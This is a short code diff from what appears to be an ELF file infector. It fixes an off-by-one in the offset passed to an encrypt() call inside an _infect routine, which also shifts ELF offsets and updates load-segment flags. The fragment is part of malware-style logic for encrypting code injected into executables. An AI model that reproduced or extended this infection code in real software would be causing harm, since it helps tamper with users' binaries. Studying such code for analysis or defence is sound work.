@@ -97,7 +97,7 @@ static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, si
 	println("OK>");
 	printnbln(crypt_off);
 	printnbln(crypt_len);
-	encrypt(((*s) + pos + 1 + crypt_off), crypt_len, (uint32_t*)KEY);
+	encrypt(((*s) + pos + crypt_off), crypt_len, (uint32_t*)KEY);
 	//reset it
 	elf_shift_offset(*s, *n, pos, bn);
 	elf_update_flags_of_load_segments(*s, *n);
